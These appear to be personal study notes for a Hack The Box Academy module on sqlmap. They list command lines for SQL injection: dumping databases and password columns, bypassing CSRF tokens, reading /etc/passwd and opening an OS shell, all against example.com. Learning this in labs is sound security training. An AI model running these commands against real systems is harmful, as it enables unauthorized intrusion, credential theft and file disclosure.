
**Advanced Enumeration:**
https://academy.hackthebox.com/module/58/section/529

Commands can be crafted by copying as a curl request from the network tab.

```shell-session
sqlmap -u "http://www.example.com/?id=1" --batch --dump
```

**Simple POST Command**
sqlmap 'example.com/example.php' --data 'id=1'

**-D**  
Specify the database name

**--where**
```shell-session
--where="name LIKE 'f%'"
```
Good for finding specific phrases; i.e. password. **Needs % in the phrase.**

**--search**
Searches for things such as columns passed through -C

e.g: --search -C password

**--tables**
List all tables in a db

**-T** 
Specify the Table name

**--schema**
Lists all tables and their columns with types
```shell-session
sqlmap -u "http://www.example.com/?id=1" --schema
```


**-C**
Show specific rows/columns

**--dump --batch**
Tells it to dump the data 

**--current-db --tables**
Tells it to show the tables located in the current database

**--crawl=2**
Useful for initial scan

-cookie='id=1*'
Specifies a cookie, * is very important can be used to test one specific value

**-r**
Used for complex HTTP requests such as passing JSON.

Copy request headers from network tab, then add the parameter in json bellow. Combine with --dump --batch.

{
    "id": 1
}

**--prefix and --suffix**
add to the start and end of commands

**Useful prefix for out of bounds SQL testing:**
 '`)'F

**--dump-all --exclude-sysdbs**
Dump all info from all tables in the database

**Start and Stop**
```shell-session
--start=2 --stop=3
```
Good for limiting responses for large tables.

**--union-cols=example**
Useful for union injections, specify number of columns in table.

```shell-session
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```


```shell-session
 sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

Dump a specific column,row combination in a specified Table.

**CSRF-TOKEN**
```shell-session
sqlmap -r lol.txt --csrf-token="t0ken" --batch --dump
```

**Random UIDs**
```shell-session
sqlmap -r lol.txt --randomize=uid -v 5 --batch --dump
```

**Reading Files**
```shell-session
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

**Bypassing Protections:**
https://academy.hackthebox.com/module/58/section/530

Getting A Shell Using SQLMap
```shell-session
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

Use different techniques with --technique
